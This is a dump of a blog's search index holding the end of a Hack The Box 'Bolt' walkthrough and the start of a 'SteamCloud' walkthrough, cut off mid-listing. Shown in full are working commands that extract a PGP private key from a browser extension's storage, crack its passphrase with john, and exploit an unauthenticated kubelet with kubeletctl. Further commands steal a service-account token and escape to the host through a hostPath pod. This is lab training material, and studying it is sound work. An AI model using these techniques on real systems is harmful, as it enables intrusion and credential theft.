result.push(\"\\r\\n-----BEGIN PGP SIGNATURE-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP MESSAGE-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP SIGNATURE-----\\r\\n\"); Binary file /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches  After searching in a lot of files, we get to the binary file that was reported above. Using strings and filtering by a PGP private key format, we obtain one:\neddie@bolt:~$ strings '/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log' | grep -oP '\\-\\-\\-\\-\\-BEGIN PGP PRIVATE [\\s\\S]*?END PGP PRIVATE KEY BLOCK\\-\\-\\-\\-\\-' | head -1 -----BEGIN PGP PRIVATE KEY BLOCK----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org 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 PSwYYWlAywj5 =cqxZ -----END PGP PRIVATE KEY BLOCK-----  Now we can read more about PGP, for example in Wikipedia. Private keys are usually protected with a passphrase. Fortunately, there is a tool called gpg2john that extracts a hash from the PGP private key in order to crack it with john:\n$ gpg2john eddie.pgp | tee eddie.hash.pgp File eddie.pgp Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson \u0026lt;eddie@bolt.htb\u0026gt;::eddie.pgp $ john --wordlist=$WORDLISTS/rockyou.txt eddie.hash.pgp Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 16777216 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status merrychristmas (Eddie Johnson) 1g 0:00:05:02 DONE 0.003307g/s 141.7p/s 141.7c/s 141.7C/s mike04..megan5 Use the \"--show\" option to display all of the cracked passwords reliably Session completed  Decrypting a PGP message Now that we have the passphrase (merrychristmas), we can decrypt the message found previously in one of the MySQL databases using the PGP private key of user eddie. This task can be done using an online tool like PGP tool:\nAs seen in the above screenshot, the encrypted message is decrypted to {\u0026quot;password\u0026quot;:\u0026quot;Z(2rmxsNW(Z?3=p/9s\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;\u0026quot;}. This password allows to access as root in the machine:\neddie@bolt:~$ su root Password: root@bolt:/home/eddie# cat /root/root.txt 0efcfd934e37c153513612d761fe564d  ","image":"/images/HTB/Bolt/Bolt.png","permalink":"https://7rocky.github.io/en/htb/bolt/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has several virtual hosts and a Docker image that contains a lot of information needed to exploit the websites. There is an SSTI vulnerability between two websites interaction. Then we can extract a PGP private key from Google Chrome cache and decrypt a message. Deep knowledge about Docker and basic web exploitation skills are needed in order to compromise this machine","time":23,"title":"Bolt"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.133   Release: 14 / 02 / 2022   Port scanning # Nmap 7.92 scan as: nmap -sC -sV -o nmap/targeted 10.10.11.133 -p 22,80,2379,2380,8443,10249,10250,10256 Nmap scan report for 10.10.11.133 Host is up (0.054s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA) | 256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA) |_ 256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! 2379/tcp open ssl/etcd-client? | tls-alpn: |_ h2 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2022-02-15T05:29:52 |_Not valid after: 2023-02-15T05:29:53 2380/tcp open ssl/etcd-server? | tls-alpn: |_ h2 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2022-02-15T05:29:52 |_Not valid after: 2023-02-15T05:29:53 8443/tcp open ssl/https-alt |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 |_http-title: Site doesn't have a title (application/json). | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2022-02-14T05:29:51 |_Not valid after: 2025-02-14T05:29:51 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Audit-Id: 5a6a8b48-3d98-4785-b57d-e3709d704122 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 9cead1c7-5b3e-4a65-ad2d-6546af46ffed | X-Kubernetes-Pf-Prioritylevel-Uid: bd47e3d9-c067-4d0b-9798-c5f06eac806d | Date: | Content-Length: 212 | {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403} | GetRequest: | HTTP/1.0 403 Forbidden | Audit-Id: f8f45295-4ea9-4170-8f7e-ea585f749415 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 9cead1c7-5b3e-4a65-ad2d-6546af46ffed | X-Kubernetes-Pf-Prioritylevel-Uid: bd47e3d9-c067-4d0b-9798-c5f06eac806d | Date: | Content-Length: 185 | {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403} | HTTPOptions: | HTTP/1.0 403 Forbidden | Audit-Id: 7e7ce172-f7f7-4615-98de-ef8846cb2020 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 9cead1c7-5b3e-4a65-ad2d-6546af46ffed | X-Kubernetes-Pf-Prioritylevel-Uid: bd47e3d9-c067-4d0b-9798-c5f06eac806d | Date: | Content-Length: 189 |_ {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot options path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403} 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). | tls-alpn: | h2 |_ http/1.1 | ssl-cert: Subject: commonName=steamcloud@1644902997 | Subject Alternative Name: DNS:steamcloud | Not valid before: 2022-02-15T04:29:57 |_Not valid after: 2023-02-15T04:29:57 |_ssl-date: TLS randomness does not represent time 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 102.14 seconds  This machine has ports 22 (SSH), 80 (HTTP), 2379 (etcd-client), 2380 (etcd-server), 8443 (kube-apiserver), 10249 (kubelet), 10250 (kubelet) and 10256 (kube-proxy) open.\nPort recognition Although port 80 is open, it has a default instalation of nginx. Nothing more.\nLooking at the ports that are exposed, we can conclude that the machine has a Kubernetes cluster. Hacktricks will be useful to compromise this machine.\nWe can see its version querying kube-apiserver:\n$ curl -k https://10.10.11.133:8443 { \"kind\": \"Status\", \"apiVersion\": \"v1\", \"metadata\": { }, \"status\": \"Failure\", \"message\": \"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\", \"reason\": \"Forbidden\", \"details\": { }, \"code\": 403 } $ curl -k https://10.10.11.133:8443/version { \"major\": \"1\", \"minor\": \"22\", \"gitVersion\": \"v1.22.3\", \"gitCommit\": \"c92036820499fedefec0f847e2054d824aea6cd1\", \"gitTreeState\": \"clean\", \"buildDate\": \"2021-10-27T18:35:25Z\", \"goVersion\": \"go1.16.9\", \"compiler\": \"gc\", \"platform\": \"linux/amd64\" }  Interacting with the kubelet We see that kubelet is exposed. This entity runs on every node of the cluster (i.e. it is running in the machine, because the cluster is likely to be single-node) and controls every Pod.\nIf this service is exposed, it is likely to be vulnerable to unauthenticated RCE (Remote Code Execution). We can test it using a request like this one:\n$ curl -sk https://10.10.11.133:10250/pods | jq | head { \"kind\": \"PodList\", \"apiVersion\": \"v1\", \"metadata\": {}, \"items\": [ { \"metadata\": { \"name\": \"kube-apiserver-steamcloud\", \"namespace\": \"kube-system\", \"selfLink\": \"/api/v1/namespaces/kube-system/pods/kube-apiserver-steamcloud\",  We get a successful response, so we can use talk to kubelet without authentication.\nWe can list all running Pods from the kubelet:\n$ curl -sk https://10.10.11.133:10250/runningpods/ | jq '.items[].metadata.name' \"etcd-steamcloud\" \"nginx\" \"storage-provisioner\" \"kube-scheduler-steamcloud\" \"kube-apiserver-steamcloud\" \"coredns-78fcd69978-hrszm\" \"kube-proxy-dnxrw\" \"kube-controller-manager-steamcloud\"  There is a way to execute commands inside a Pod. Using curl we should do it like this:\n$ curl -kG 'https://10.10.11.133:10250/exec/default/nginx/nginx' -d 'stdin=1' -d 'output=1' -d 'tty=1' -d 'command=whoami' Upgrade request required  But it does not work because it requires an upgrade to WebSockets, and curl does not support it.\nHowever, we can install kubeletctl from the releases page or compiling the Go project. Then, we can scan all Pods to see if they are vulnerable to RCE:\n$ ./kubeletctl scan rce --server 10.10.11.133 ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐ │ Node with pods vulnerable to RCE │ ├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤ │ │ NODE IP │ PODS │ NAMESPACE │ CONTAINERS │ RCE │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ │ │ │ │ │ RUN │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 1 │ 10.10.11.133 │ nginx │ default │ nginx │ + │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 2 │ │ etcd-steamcloud │ kube-system │ etcd │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 3 │ │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 4 │ │ coredns-78fcd69978-hrszm │ kube-system │ coredns │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 5 │ │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 6 │ │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 7 │ │ storage-provisioner │ kube-system │ storage-provisioner │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 8 │ │ kube-proxy-dnxrw │ kube-system │ kube-proxy │ + │ └───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘  The above beautiful table shows that the Pod called nginx is vulnerable to RCE. Hence we can run commands inside the container nginx of the Pod called nginx as well:\n$ ./kubeletctl run 'ls /' --namespace default --pod nginx --container nginx --server 10.10.11.133 bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var  There is no need to use a reverse shell this time. We can read the user.txt flag from inside this container:\n$ ./kubeletctl run 'ls /root' --namespace default --pod nginx --container nginx --server 10.10.11.133 user.txt $ ./kubeletctl run 'cat /root/user.txt' --namespace default --pod nginx --container nginx --server 10.10.11.133 417b04ea8221ce9aa994877243e5fd98  Privilege escalation Now that we can run commands inside a container of a Pod, we can take the token and the client certificate needed to authenticate to kube-apiserver (port 8443):\n$ ./kubeletctl run 'cat /run/secrets/kubernetes.io/serviceaccount/token' --namespace default --pod nginx --container nginx --server 10.10.11.133 eyJhbGciOiJSUzI1NiIsImtpZCI6IkJwZHBDYnJzNUptVHlVd1YxeGlzR2lGYlpQX2xYUzlGY3k0MFd5MGo5Zk0ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9 jYWwiXSwiZXhwIjoxNjc2NDc0MTk1LCJpYXQiOjE2NDQ5MzgxOTUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY 2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImEzNmU2NGZkLTlhZGEtNDcwOC1iMDEyLTM0N2VhMmVjOTliMCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInV pZCI6Ijk5MjUzMjU0LThiNjMtNDZiMi04MWUwLWY2ODQ1NzkzODgzMiJ9LCJ3YXJuYWZ0ZXIiOjE2NDQ5NDE4MDJ9LCJuYmYiOjE2NDQ5MzgxOTUsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhd Wx0OmRlZmF1bHQifQ.Xft1ybVzOOWCwsN7JwjoUxEFoAgOKSMU9MRBuwRGT5r2ruqX7ZcDnyMV3xe0Zcx-JGKPz3QY0EfdapLeldo_7_PfT3pXWZ1YkIuExpGSId9hHhIUXb89lc9IccH1mXkf3tHHEXjf9HYF pYCR6yRab8pcrgcpWZPtGWSIKmZC7D9YfkFerfKGT06c69YXhbdhOgXATEPu9cX6ihBCjHcu_zm8xqY1JDA4zjLj-dWy6lcwo8Q_FKR3irDr8DZP6t-SmL7yKeGL1IOSirY1rDazwG8R0YG2Xk0n-Ff-moo5B3 Kg4Jv-Cb74wD2bUVb2OeOpNKAD7WGynKTqf_JVa2FHTQ $ token=$(./kubeletctl run 'cat /run/secrets/kubernetes.io/serviceaccount/token' --namespace default --pod nginx --container nginx --server 10.10.11.133) $ ./kubeletctl run 'cat /run/secrets/kubernetes.io/serviceaccount/ca.crt' --namespace default --pod nginx --container nginx --server 10.10.11.133 | tee ca.crt -----BEGIN CERTIFICATE----- MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7 deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o 1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+ 9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0 JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz kf2eZIBNMp0TFg== -----END CERTIFICATE-----  To talk with the kube-apiserver we can use kubectl (not kubeletctl) providing the URL of the kube-apiserver, the token and the client certificate.\nThe idea is to create a Pod with a volume that mounts the host\u0026rsquo;s file system, so that we can execute commands inside the Pod (with kubeletctl unauthenticated RCE) and read files from the server (such as /root/root.txt).\nThis is the manifest of the Pod I will deploy:\napiVersion: v1 kind: Pod metadata: name: escaper spec: containers: - name: escaper image: nginx:1.14.2 volumeMounts: - name: logs mountPath: /var/log/host volumes: - name: logs hostPath: path: / type: Directory  This Pod will mount / from the host machine into /var/log/host inside the container (we could have chosen another directory).\nWe can apply it using kubectl:\n$ kubectl --token=$token --certificate-authority=./ca.crt apply -f escaper.yaml -n default -s https://10.10.11.133:8443 pod/escaper created  Now we have deployed it in the Kubernetes cluster. We can check it with kubeletctl:\n$ ./kubeletctl scan rce --server 10.10.11.133 ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐ │ Node with pods vulnerable to RCE │ ├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤ │ │ NODE IP │ PODS │ NAMESPACE │ CONTAINERS │ RCE │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ │ │ │ │ │ RUN │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 1 │ 10.10.11.133 │ nginx │ default │ nginx │ + │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 2 │ │ etcd-steamcloud │ kube-system │ etcd │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 3 │ │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 4 │ │ coredns-78fcd69978-hrszm │ kube-system │ coredns │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 5 │ │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 6 │ │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 7 │ │ storage-provisioner │ kube-system │ storage-provisioner │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 8 │ │ kube-proxy-dnxrw │ kube-system │ kube-proxy │ + │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 9 │ │ escaper │ default │ escaper │ + │ └───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘  Now we can run commands on this new container:\n$ ./kubeletctl run 'ls -la --time-style=%2b /var/log/host' --namespace default --pod escaper --container escaper --server 10.10.11.133 total 68 drwxr-xr-x 18 root root 4096 . drwxr-xr-x 1 root root 4096 .. lrwxrwxrwx 1 root root 7 bin - usr/bin drwxr-xr-x 3 root root 4096 boot drwxr-xr-x 16 root root 3080 dev drwxr-xr-x 75 root root 4096 etc drwxr-xr-x 3 root root 4096 home 